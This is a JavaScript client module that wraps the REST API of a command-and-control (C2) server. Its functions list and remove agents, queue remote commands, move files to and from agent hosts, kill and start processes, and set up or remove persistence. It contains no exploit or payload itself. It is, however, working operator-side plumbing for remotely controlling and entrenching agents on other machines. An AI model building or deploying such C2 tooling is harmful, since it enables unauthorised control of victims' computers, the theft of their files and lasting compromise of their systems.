/**
 * api.js — Typed wrappers around every C2 REST endpoint.
 * All methods return plain JS objects (already parsed from JSON).
 * On HTTP error they throw an Error with a human-readable message.
 */

const API = (() => {
  const BASE = '/api/v1';

  async function request(method, path, body) {
    const opts = {
      method,
      headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
    };
    if (body !== undefined) opts.body = JSON.stringify(body);

    const res = await fetch(BASE + path, opts);
    const json = await res.json().catch(() => ({}));

    if (!res.ok || json.success === false) {
      throw new Error(json.error || json.message || `HTTP ${res.status}`);
    }
    return json.data ?? json;
  }

  // ── Agents ──────────────────────────────────
  const agents = {
    list:   ()   => request('GET',    '/agents'),
    get:    (id) => request('GET',    `/agents/${id}`),
    remove: (id) => request('DELETE', `/agents/${id}`),
  };

  // ── Commands ─────────────────────────────────
  const commands = {
    execute: (agentId, cmd, opts = {}) =>
      request('POST', '/command', { agent_id: agentId, command: cmd, ...opts }),

    status:  (id)          => request('GET',    `/command/${id}/status`),
    history: (agentId, qs = '') =>
      request('GET', `/agent/${agentId}/commands${qs}`),
    clearQueue: (agentId)  => request('DELETE', `/agent/${agentId}/queue`),
  };

  // ── Files ────────────────────────────────────
  const files = {
    upload:   (agentId, body) => request('POST', `/agent/${agentId}/upload`,   body),
    download: (agentId, body) => request('POST', `/agent/${agentId}/download`, body),
  };

  // ── Processes ────────────────────────────────
  const processes = {
    list:  (agentId)       => request('POST', `/agent/${agentId}/process/list`,  {}),
    kill:  (agentId, pid)  => request('POST', `/agent/${agentId}/process/kill`,  { process_id: pid }),
    start: (agentId, body) => request('POST', `/agent/${agentId}/process/start`, body),
  };

  // ── Persistence ──────────────────────────────
  const persistence = {
    setup:  (agentId, body) => request('POST', `/agent/${agentId}/persistence/setup`,  body),
    remove: (agentId, body) => request('POST', `/agent/${agentId}/persistence/remove`, body),
  };

  // ── Server ───────────────────────────────────
  const server = {
    health:     ()         => request('GET', '/health'),
    stats:      ()         => request('GET', '/stats'),
    logs:       (qs = '')  => request('GET', `/logs${qs}`),
    queueStats: ()         => request('GET', '/queue/stats'),
  };

  return { agents, commands, files, processes, persistence, server };
})();
